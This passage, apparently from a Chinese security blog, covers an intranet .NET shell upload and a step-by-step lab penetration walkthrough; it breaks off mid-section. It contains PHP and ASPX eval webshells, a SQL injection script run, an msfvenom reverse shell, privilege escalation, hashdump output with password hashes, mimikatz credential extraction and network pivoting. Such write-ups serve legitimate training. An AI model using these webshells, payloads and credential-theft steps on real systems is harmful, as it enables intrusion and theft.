title=\"内网180的.NET拿shell\"></a>内网180的.NET拿shell</h1><p>最近对公司内网进行渗透，发现了一台项目部署的页面，就有了下面的后续。</p>\n<ol>\n<li>打开发现两个服务，一个是iis7.5的默认页面</li>\n</ol>\n<p><img src=\"ibbfxokmtXxWwNHJmRMTRuxMsDaU4IwL1F5XAALqhvc.png\" alt=\"image\"></p>\n<ol start=\"2\">\n<li>另一个是项目上传部署的页面</li>\n</ol>\n<p><img src=\"dX6X8uGiK7BUAg6hOSFQAsFgS0-AOhT8DcbAk3wkBbg.png\" alt=\"image\"></p>\n<ol start=\"3\">\n<li>根据直觉告诉我，这里肯定可以上传项目然后getshell</li>\n<li>尝试直接上传之后未成功</li>\n<li>确认为.NET的中间件，尝试上传1.aspx</li>\n</ol>\n<p><img src=\"5fWwoiRzSvj_9INIbM_SCqLgirVne8WeOsOz8RY3HOo.png\" alt=\"image\"></p>\n<p>系统提示必须为zip压缩包</p>\n<p><img src=\"N37q0CqU85y3CcxJ13Su9H5Tph9d2CgeYECDQ64xpac.png\" alt=\"image\"></p>\n<ol start=\"6\">\n<li>添加一个名称为“1”的站点</li>\n</ol>\n<p><img src=\"d-DEnCYeDRLs1BqH6CeIkf2UyK-auFQ-zbvLO1iDW3c.png\" alt=\"image\"></p>\n<p>然后将1.aspx压缩成1.zip，最后进行上传</p>\n<p>其中1.aspx的内容为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=<span class=\"string\">&quot;Jscript&quot;</span>%&gt;&lt;%<span class=\"built_in\">eval</span>(Request.Item[<span class=\"string\">&quot;chopper&quot;</span>],<span class=\"string\">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure>\n\n\n<p>7.访问URL：<a href=\"http://192.168.1.180:8081/1/1.aspx\">http://192.168.1.180:8081/1/1.aspx</a></p>\n<p><img src=\"gg9qlXn7W-ZW9vcVxcoOSodoatBweTRWAK2M_UayAlY.png\" alt=\"image\"></p>\n<p>8.确认文件是存在的。</p>\n<p>不存在的文件的页面如下：</p>\n<p><img src=\"GVLjYUG5RNku2U4m5SNx1Bb11dWDEub9bqTXKMiKLB8.png\" alt=\"image\"></p>\n<p><img src=\"r4_h08qGXKK3FjjQHBtBhJwsHOF6J-ePjzjgjyi9-4c.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">beacon&gt; hashdump</span><br><span class=\"line\">[*] Tasked beacon to dump hashes</span><br><span class=\"line\">[+] host called home, sent: 82501 bytes</span><br><span class=\"line\">[+] received password hashes:</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d4616051c370c1ae742f4db998fbdae1:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:4a1592e183d8b7b58780c2d82ca8d622:::</span><br></pre></td></tr></table></figure>\n<p><img src=\"3AUowFEz_Gmpp9RRlR1x_-3e9Q-KGGD8dv46vEPdww4.png\" alt=\"image\"></p>\n<p>Net view</p>\n<p><img src=\"087SBPvwCfeHUVbfckJSapIf0_LvdpxNJzbF4T8jALc.png\" alt=\"image\"></p>\n<p>对1.155进行凭证传递</p>\n<p><img src=\"nELHEi6IQZ1idS8_BKZWGYO7hMIzSmEu0eGWyV5cm4I.png\" alt=\"image\"></p>\n<p><img src=\"itJEjxZwAuRa_9FQghUQZiAGHJcI0zsi9FWbVlcqcXw.png\" alt=\"image\"></p>\n","categories":["渗透笔记"],"tags":[".net"]},{"title":"打靶日记（一） 完整的渗透测试实例","url":"/2021/10/11/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%20%E5%AE%8C%E6%95%B4%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/","content":"<h1 id=\"打靶日记（一）-完整的渗透测试实例\"><a href=\"#打靶日记（一）-完整的渗透测试实例\" class=\"headerlink\" title=\"打靶日记（一） 完整的渗透测试实例\"></a>打靶日记（一） 完整的渗透测试实例</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第一篇。</strong></p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>开一个新的分类“打靶日记（moon）”，这一个系列记录了我的打靶的日常，这系列大概是打了六七个暗月师傅的靶场。于是乎，我一一下载到本地进行搭建和攻击，包含了外部打点、权限提升、权限维持、内网横向渗透、域渗透等内容。这个是第一个靶场。</p>\n<h1 id=\"1-靶场介绍\"><a href=\"#1-靶场介绍\" class=\"headerlink\" title=\"1.靶场介绍\"></a>1.靶场介绍</h1><p>本靶场存在四个 flag 把下载到的虚拟机环境导入到虚拟机，本靶场需要把网络环境配置好</p>\n<h1 id=\"1-1本靶场示意图\"><a href=\"#1-1本靶场示意图\" class=\"headerlink\" title=\"1.1本靶场示意图\"></a>1.1本靶场示意图</h1><p><img src=\"NViePoqC4j_5inIBPO-oFYsnSjPGG9sorkByH_Fkx9E.png\" alt=\"image\"></p>\n<p> </p>\n<h1 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2. 信息收集\"></a>2. 信息收集</h1><h2 id=\"2-1-主机发现\"><a href=\"#2-1-主机发现\" class=\"headerlink\" title=\"2.1.主机发现\"></a>2.1.主机发现</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"9ASPbNPqtkTrJwN2RrhEQ-_hrFTeqiSwUkg_s8ef0mk.png\" alt=\"image\"></p>\n<h2 id=\"2-2masscan-端口扫描\"><a href=\"#2-2masscan-端口扫描\" class=\"headerlink\" title=\"2.2masscan 端口扫描\"></a>2.2masscan 端口扫描</h2><p>（使用发包率10000的时候没扫出来）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan -p 0-65535 192.168.1.134 --rate=1000</span><br></pre></td></tr></table></figure>\n<p><img src=\"73VhIsA3jGWi7q4gw-YC98Z0kbpvek9a00CH9sp-ErI.png\" alt=\"image\"></p>\n<h2 id=\"2-3Nmap进行端口信息探测\"><a href=\"#2-3Nmap进行端口信息探测\" class=\"headerlink\" title=\"2.3Nmap进行端口信息探测\"></a>2.3Nmap进行端口信息探测</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -sC -A 192.168.1.134 -p 135,49155,6588,21,3389,80,999,53,49154 -oA cc123-port</span><br></pre></td></tr></table></figure>\n<p><img src=\"WTgtLhL0oEAEETHakrC9_OaVQ3ZOgBQ0-WAVSrihjAQ.png\" alt=\"image\"></p>\n<p> </p>\n<h2 id=\"2-4网站信息\"><a href=\"#2-4网站信息\" class=\"headerlink\" title=\"2.4网站信息\"></a>2.4网站信息</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://192.168.1.134:999/</span><br></pre></td></tr></table></figure>\n<p><img src=\"cpzzjf0auVCErAh4wy_YNnxQW2I9YB_oliXS_xInH7I.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://192.168.1.134/</span><br></pre></td></tr></table></figure>\n<p><img src=\"N3bJfbtSNhIKrkr3Z-ZlR7D5h-pzCsE0XgoTsTRXImk.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://192.168.1.134:6588/</span><br></pre></td></tr></table></figure>\n<p><img src=\"6xuBx1STzfzrRV2IPI36DmuGa5EVVa31bF-wJhBIELk.png\" alt=\"image\"></p>\n<h1 id=\"3-本地设置\"><a href=\"#3-本地设置\" class=\"headerlink\" title=\"3.本地设置\"></a>3.本地设置</h1><h2 id=\"3-1-绑定本地-hosts\"><a href=\"#3-1-绑定本地-hosts\" class=\"headerlink\" title=\"3.1.绑定本地 hosts\"></a>3.1.绑定本地 hosts</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\System32\\drivers\\etc\\hosts</span><br></pre></td></tr></table></figure>\n<p><img src=\"YpfNq7mNoPapswTaBR_Ovc8NpG5rj-qb7OWGYGT48uo.png\" alt=\"image\"></p>\n<h2 id=\"3-2设置本地网关\"><a href=\"#3-2设置本地网关\" class=\"headerlink\" title=\"3.2设置本地网关\"></a>3.2设置本地网关</h2><p><img src=\"vNqlrF-gskUi7poAk52Ibu43nxWhhWEaZ_I1hXdImWc.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/resolv.conf</span><br><span class=\"line\">nameserver 192.168.1.134</span><br></pre></td></tr></table></figure>\n<p><img src=\"sr1z3NwYQruTO9tzZ2utBUzv2S6UNav9nqQI2TKcdow.png\" alt=\"image\"></p>\n<p> </p>\n<h1 id=\"4-收集子域名\"><a href=\"#4-收集子域名\" class=\"headerlink\" title=\"4.收集子域名\"></a>4.收集子域名</h1><h2 id=\"4-1wfuzz穷举子域名\"><a href=\"#4-1wfuzz穷举子域名\" class=\"headerlink\" title=\"4.1wfuzz穷举子域名\"></a>4.1wfuzz穷举子域名</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H <span class=\"string\">&quot;Host:FUZZ.cc123.com&quot;</span> --hw 53</span><br></pre></td></tr></table></figure>\n<p><img src=\"7prvxMoVkG3WGOcWHLeT9RSnV3AC9jWuhmJP8BHHaxY.png\" alt=\"image\"></p>\n<p>显示没有路由</p>\n<p>在靶机配置DNS</p>\n<p><img src=\"ZxeH8-pBSyr_CBjF3J5LFnpQa9-Oq9GX8XZ6leVCmoE.png\" alt=\"image\"></p>\n<p> </p>\n<p>修改hoset</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/resolv.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"QRAVxsSBZJFZ8xMzBs4AvXxK8kq86k8UN0lxXxVibTw.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H <span class=\"string\">&quot;Host:FUZZ.cc123.com&quot;</span> --hw 53</span><br></pre></td></tr></table></figure>\n<p>过滤掉53</p>\n<p><img src=\"tCIffzdl8urL0VjbsfF9JPcULcj21zUsjQrHY-G5HIU.png\" alt=\"image\"></p>\n<h1 id=\"5-子域名信息\"><a href=\"#5-子域名信息\" class=\"headerlink\" title=\"5.子域名信息\"></a>5.子域名信息</h1><table>\n<thead>\n<tr>\n<th><br>Dedecms<br></th>\n<th><br>new.cc123.com<br></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><br>kesionEDU<br></td>\n<td><br>www. cc123.com<br></td>\n</tr>\n<tr>\n<td><br>net<br></td>\n<td><br>ww2 cc123.com<br></td>\n</tr>\n</tbody></table>\n<h1 id=\"6-漏洞测试\"><a href=\"#6-漏洞测试\" class=\"headerlink\" title=\"6.漏洞测试\"></a>6.漏洞测试</h1><h2 id=\"6-1dedecms安全检测\"><a href=\"#6-1dedecms安全检测\" class=\"headerlink\" title=\"6.1dedecms安全检测\"></a>6.1dedecms安全检测</h2><p>查看版本号</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">new.cc123.com/data/admin/ver.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"6dKRrP3bBIIJTAHuHKlhARrtM5N8vjY1IQUdA7Z02Ew.png\" alt=\"image\"></p>\n<p>会员注册处有注入的漏洞</p>\n<p><a href=\"http://new.cc123.com/member/\">http://new.cc123.com/member/</a></p>\n<p>注册会员</p>\n<p><img src=\"DZBa5XTD5Iw4LMnJYx0H2dND7YvAMiWavIyx4XxxjtM.png\" alt=\"image\"></p>\n<p>添加分类</p>\n<p><img src=\"7yY-eJrJoDG-41Uvwy7xcX-5HJFApHLyqmI3QgXKfJo.png\" alt=\"image\"></p>\n<p>拿到cookie</p>\n<p><img src=\"AzXMAAmn6UdLyq0Qus_4Yjo8isfTilyFOClLdC7gBgY.png\" alt=\"image\"></p>\n<p>放到脚本的cookie记事本中</p>\n<p><img src=\"b8y0VKylczs3pQ0-Rj435mV96NAOYxJFNJR_UvEs6ek.png\" alt=\"image\"></p>\n<p>执行脚本，指定网站</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python2 .\\Dedecms_20150618_member_sqli.py http://new.cc123.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"5so5sbZ7qrtvoZMxSswt1CURnDX2K6b4j0EukcnxjVs.png\" alt=\"image\"></p>\n<p> </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">密文 812df726be884ddcfc41 解密：admin7788</span><br></pre></td></tr></table></figure>\n<p>在网站解密</p>\n<p> <a href=\"http://somd5.com/\">http://somd5.com/</a></p>\n<p><img src=\"ciFt5RyAlgdbYVOhKpfrqcpgz8MTRSE99tWNPyyoh6A.png\" alt=\"image\"></p>\n<p>得到密码之后，来到后台</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://new.cc123.com/dede/login.php?gotopage=%2Fdede%2F</span><br></pre></td></tr></table></figure>\n<p>输入账号密码之后登录：</p>\n<p><img src=\"Uq7BH-O-KY8vILNvggdj2go3q5TxrDGmYqy0Fz2SqUk.png\" alt=\"image\"></p>\n<p>在文件管理处上传webshell</p>\n<p><img src=\"TkEIY1wmT1mNyNk2YUsvtaI6ldxuYe9jH5d_rJOgjgE.png\" alt=\"image\"></p>\n<p> </p>\n<p>添加一句话木马语句到图片中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php @<span class=\"built_in\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;garck&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"RjQwtYH7zjjNMExDOcPiWXvnpG3bUAx_wFTbYmnuwjM.png\" alt=\"image\"></p>\n<p>上传文件</p>\n<p>抓包修改后缀</p>\n<p> </p>\n<p><img src=\"ICrU6rgOUNMABMn9NnBwqsWYVgEiDZk7eqwM6SRFiD8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://new.cc123.com/a/ma.php</span><br></pre></td></tr></table></figure>\n<p>验证</p>\n<p><img src=\"AHrcr7z5oP9oc4G5y04Q_P8BuDNrbbu90GXx8bVpgng.png\" alt=\"image\"></p>\n<p>下载中国蚁剑加载器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>\n<p>初始化的时候未检测代码的时候会进行自动下载</p>\n<p><img src=\"-yyLQnZ9rs089GH2I2AXlsjTWqF7S7UKRtf9Vkyy6fs.png\" alt=\"image\"></p>\n<p>连接一句话木马</p>\n<p><img src=\"cFMk1PbdFH5_D_B8jmxuQNDKw7t-Yqi8nyyJWKccALU.png\" alt=\"image\"></p>\n<p> </p>\n<p>7.提取服务器 </p>\n<p>在终端执行命令失败</p>\n<p><img src=\"qoHw0HxhT21RI-MGqWWgG56SDli2j3ud-i2NFIFz3H4.png\" alt=\"image\"></p>\n<p>发现.net的功能</p>\n<p><img src=\"TmrpEsa7SXUACqdNUpNwbHEMhC6_F3e1Bjdy-mTdHKc.png\" alt=\"image\"></p>\n<p>上传.net的大马</p>\n<p>访问地址：<a href=\"http://new.cc123.com/a/ASPXSpy2014.aspx\">http://new.cc123.com/a/ASPXSpy2014.aspx</a></p>\n<p>密码是：admin</p>\n<p><img src=\"wHACqvXtYBqILX1ZBZeiY-fZQR8TWQstZjIJWcbr5Xo.png\" alt=\"image\"></p>\n<p>可以执行cmd命令</p>\n<p><img src=\"x7HtvwwmLnoiY3LIZKcj6nyqNiayz0F90dR23m48r2o.png\" alt=\"image\"></p>\n<h2 id=\"7-1metasploit-windows提权\"><a href=\"#7-1metasploit-windows提权\" class=\"headerlink\" title=\"7.1metasploit windows提权\"></a>7.1metasploit windows提权</h2><p>生成msf的木马</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.133 lport=55555 -f exe &gt;garck.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"ceS6JTytjLnTOMSTZqMr90jTeOMFsi90QXiI63MTTKA.png\" alt=\"image\"></p>\n<p>上传至于服务器，发现上传的时候被拒绝</p>\n<p><img src=\"Wh-bnY92w8w2FJg_sI-nOeprDwqxZkxqxVs_BiwwXHc.png\" alt=\"image\"></p>\n<h2 id=\"7-2扫描可写目录\"><a href=\"#7-2扫描可写目录\" class=\"headerlink\" title=\"7.2扫描可写目录\"></a>7.2扫描可写目录</h2><p>上传扫描 目录可写 的脚本</p>\n<p><img src=\"qBOYOxMJd5fjWFTxqBq9DVw7kAsE3LrGL62l01VK6-g.png\" alt=\"image\"></p>\n<p>开始检测</p>\n<p><img src=\"ANFMrc2N0-WCNAPpRT_Nl7_MRsAif-gld92LVU1z67Y.png\" alt=\"image\"></p>\n<p>发现以下的目录是可写的</p>\n<p><img src=\"ufS110r4z6qHpK3olMtFRFupgDHQqp2c2JBIAVqEG2I.png\" alt=\"image\"></p>\n<p>将msf生成的木马上传至于：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\windows\\debug\\WIA\\</span><br></pre></td></tr></table></figure>\n<p><img src=\"pL0dX_xFMfQSAJMsuBLbk8OjPhJl4ZBLKb75QANgZk0.png\" alt=\"image\"></p>\n<p>开启msf的监听</p>\n<p>打开msf控制端</p>\n<p>Msfconsole</p>\n<p><img src=\"Dm2uXp5ALsH1uAxiUvIPgvIF3gWtM6hqX2vz9VApBa4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">选择handler模块</span><br><span class=\"line\"> use exploit/multi/handler</span><br><span class=\"line\">设置连接的类型为windows</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">设置监听的主机IP为自己</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 192.168.1.133</span><br><span class=\"line\">设置监听的端口为55555</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 55555</span><br><span class=\"line\">执行刚才上传的木马</span><br><span class=\"line\">c:\\windows\\debug\\WIA\\garck.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"tm2cOIYqg_uTnv0KIgEDeKsIxwLz5hxyNH_VY3CMoPo.png\" alt=\"image\"></p>\n<h2 id=\"7-3得到meterpreter\"><a href=\"#7-3得到meterpreter\" class=\"headerlink\" title=\"7.3得到meterpreter\"></a>7.3得到meterpreter</h2><p>发现成功上线了</p>\n<p><img src=\"hL_vfQEFOqYd6LhM2aN40ZpJfazddI_W2HHed7ltomA.png\" alt=\"image\"></p>\n<p>查看当前权限，发现为比较普通的iis用户权限</p>\n<p><img src=\"VxI_RqpveEL0Ec_rMhhLfdMttTvbr7viVy0-lAOV8KI.png\" alt=\"image\"></p>\n<p> 7.4检测能提权的漏洞</p>\n<p>开始检测提权</p>\n<p>使用模块查询是否可以提权</p>\n<p>Background</p>\n<p>检测可以用来提权的模块</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use post/multi/recon/local_exploit_suggester</span><br><span class=\"line\"><span class=\"built_in\">set</span> session 2</span><br></pre></td></tr></table></figure>\n<p><img src=\"qDhS2K6blhHMIEd9x_Fn5tnGb-KDOXDoaqtsMFQFA-E.png\" alt=\"image\"></p>\n<h2 id=\"7-5ms16-075提权\"><a href=\"#7-5ms16-075提权\" class=\"headerlink\" title=\"7.5ms16_075提权\"></a>7.5ms16_075提权</h2><p>开始提权</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class=\"line\"><span class=\"built_in\">set</span> session 2</span><br><span class=\"line\">run</span><br><span class=\"line\">getuid</span><br></pre></td></tr></table></figure>\n<p><img src=\"Xm2RCACtkJFnncQnXuwUlLoNxoPVirpfaxKKOYPeVZ0.png\" alt=\"image\"></p>\n<h1 id=\"9-测试ww2-cc123-com安全\"><a href=\"#9-测试ww2-cc123-com安全\" class=\"headerlink\" title=\"9.测试ww2.cc123.com安全\"></a>9.测试ww2.cc123.com安全</h1><h2 id=\"9-1gobuster目录扫描\"><a href=\"#9-1gobuster目录扫描\" class=\"headerlink\" title=\"9.1gobuster目录扫描\"></a>9.1gobuster目录扫描</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster <span class=\"built_in\">dir</span> -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x <span class=\"string\">&quot;aspx,html&quot;</span> -o ~/cc123/cc123.<span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p>扫描网站目录</p>\n<p><img src=\"MkEBCbGDgMEJ0GpVkoTOT4LnU6Fz-2RTjcd922HWj8k.png\" alt=\"image\"></p>\n<p><a href=\"http://ww2.cc123.com/admin\">http://ww2.cc123.com/admin</a> 管理后台 </p>\n<p><a href=\"http://ww2.cc123.com/editor\">http://ww2.cc123.com/editor</a> 编辑器 </p>\n<p>经测试后台的密码是 cc123</p>\n<h2 id=\"9-2SQL注入拿下mssql服务器\"><a href=\"#9-2SQL注入拿下mssql服务器\" class=\"headerlink\" title=\"9.2SQL注入拿下mssql服务器\"></a>9.2SQL注入拿下mssql服务器</h2><p>登录：<a href=\"http://ww2.cc123.com/admin/Login.aspx\">http://ww2.cc123.com/admin/Login.aspx</a></p>\n<p>admin cc123</p>\n<p>cc123 qweasd123</p>\n<p><img src=\"vB5c5JLNrCxDSlUYeXWS16OtdDQTOPVRYIZWD6UIFbs.png\" alt=\"image\"></p>\n<p>抓取数据包</p>\n<p><img src=\"r8OXcWvwW9un3NL4CeDC7mgetOmyE4_GwZUatSWU2wo.png\" alt=\"image\"></p>\n<p>保存到22.txt中</p>\n<p>测试注入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -r 22.txt --dbms mssql -v 1 --batch</span><br></pre></td></tr></table></figure>\n<p><img src=\"Z8rEZGEezVKgzbSN_z9brHhoIS6_P2t79J5ttc4sags.png\" alt=\"image\"></p>\n<p>列出库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -r 22.txt --dbms mssql -v 1 --dbs</span><br></pre></td></tr></table></figure>\n<p><img src=\"9_T2AcVm4uKoHVCRAPkCl3Kjt8gtK1PnJADinpIM6Mk.png\" alt=\"image\"></p>\n<p>获取 **mssql shell **</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlmap -r 22.txt --dbms mssql -v 1 --os-shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"MMtwJc1WBqWtxeIeL1eJnLa4H7F3sR1u1vHvv2HYD3Y.png\" alt=\"image\"></p>\n<h1 id=\"10-多重网段内网渗透\"><a href=\"#10-多重网段内网渗透\" class=\"headerlink\" title=\"10.多重网段内网渗透\"></a>10.多重网段内网渗透</h1><h2 id=\"10-1web服务器信息收集\"><a href=\"#10-1web服务器信息收集\" class=\"headerlink\" title=\"10.1web服务器信息收集\"></a>10.1web服务器信息收集</h2><h3 id=\"10-1-1网卡信息\"><a href=\"#10-1-1网卡信息\" class=\"headerlink\" title=\"10.1.1网卡信息\"></a>10.1.1网卡信息</h3><p>Ifconfig</p>\n<p><img src=\"qjM0CE5Zed9XaJVd5hpJRg5nCZC7o6F63Ry2Oqaqu7c.png\" alt=\"image\"></p>\n<p>查到两个IP：</p>\n<p>10.10.10.128</p>\n<p>192.168.1.134</p>\n<p> </p>\n<h3 id=\"10-1-2查看路由信息\"><a href=\"#10-1-2查看路由信息\" class=\"headerlink\" title=\"10.1.2查看路由信息\"></a>10.1.2查看路由信息</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run get_local_subnets</span><br></pre></td></tr></table></figure>\n<p><img src=\"jI2fCRgXKUR5bMCTYwGQRNo4rZo76qealIbeTyhd_XQ.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Local subnet: 10.10.10.0/255.255.255.0</span><br><span class=\"line\">Local subnet: 192.168.1.0/255.255.255.0</span><br></pre></td></tr></table></figure>\n<h3 id=\"10-1-3哈希的获取\"><a href=\"#10-1-3哈希的获取\" class=\"headerlink\" title=\"10.1.3哈希的获取\"></a>10.1.3哈希的获取</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run hashdump</span><br></pre></td></tr></table></figure>\n<p><img src=\"FTWvpeVSZmlTv5O2S_8mNNQyHZHbV2RSZoUHKPeoxLU.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c933df09b600efabee0791aaccc43f2:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">MySQL_HWS:1001:aad3b435b51404eeaad3b435b51404ee:6a75a75e4cfd3cf00faf743e17e90a53:::</span><br><span class=\"line\">PhpMyAdmin_HWS:1002:aad3b435b51404eeaad3b435b51404ee:a14b615c584d6b043f42f1cfab9779cd:::</span><br><span class=\"line\">huweishen542147:1004:aad3b435b51404eeaad3b435b51404ee:c76eea2615348c5228f7027d3ccab02d:::</span><br><span class=\"line\">cc123:1005:aad3b435b51404eeaad3b435b51404ee:afdeb425b4a55982deb4e80fa3387576:::</span><br><span class=\"line\">newcc123:1007:aad3b435b51404eeaad3b435b51404ee:97824315153b4dd665d6c688f446ebf1:::</span><br><span class=\"line\">ww2cc123:1008:aad3b435b51404eeaad3b435b51404ee:adadf2dd832421c26a96705fd09a32bd:::</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<p>进程迁移到1568</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">migrate 1568</span><br></pre></td></tr></table></figure>\n<p><img src=\"PB9rwD8xQlSnxKCukTy6G3JMovi0ursc-ONKOxbPVbY.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<h3 id=\"10-1-4使用mimikatz获取明文\"><a href=\"#10-1-4使用mimikatz获取明文\" class=\"headerlink\" title=\"10.1.4使用mimikatz获取明文\"></a>10.1.4使用mimikatz获取明文</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">加载mimikatz</span><br><span class=\"line\">load mimikatz </span><br><span class=\"line\">获取<span class=\"built_in\">hash</span></span><br><span class=\"line\">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>\n<p><img src=\"Ymj3fnSJAMbSX5uzpsAhlZEHm3ZDi2qvQ85vZtPl5EM.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">搜索密码</span><br><span class=\"line\">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>\n<p><img src=\"NHbFAUK0PN_9XO-8HlZjs_k7-XT8tCZXAbthXU-iKJo.png\" alt=\"image\"></p>\n<p>整理结果</p>\n<p>使用wdigest 或者tspkg</p>\n<p><img src=\"hujarG_udnZb65ox6Oau3BIO5NSGrkesO2HUgkpywSA.png\" alt=\"image\"></p>\n<h3 id=\"10-1-5添加路由进行内网渗透\"><a href=\"#10-1-5添加路由进行内网渗透\" class=\"headerlink\" title=\"10.1.5添加路由进行内网渗透\"></a>10.1.5添加路由进行内网渗透</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">（绑定路由）</span><br><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"-YDiAhCqltzjkO1hFDH9987pN6T8lmfdy_ELUn3qTq4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看绑定结果</span><br><span class=\"line\">run autoroute -p</span><br></pre></td></tr></table></figure>\n<p><img src=\"hBDm0T-TDEwkqk7y4CMYPydxs711wY5Yn529rwLtfPk.png\" alt=\"image\"></p>\n<p>Background</p>\n<h3 id=\"10-1-6启动-socks-代理\"><a href=\"#10-1-6启动-socks-代理\" class=\"headerlink\" title=\"10.1.6启动 socks 代理\"></a>10.1.6启动 socks 代理</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport 2222</span><br><span class=\"line\">options</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"JuJn0NRaR-jBHtPKhxwKeErb0Ks2Gx3AiMkD1hD9-n4.png\" alt=\"image\"></p>\n<h3 id=\"10-1-7修改-proxychains-配置文件\"><a href=\"#10-1-7修改-proxychains-配置文件\" class=\"headerlink\" title=\"10.1.7修改 proxychains 配置文件\"></a>10.1.7修改 proxychains 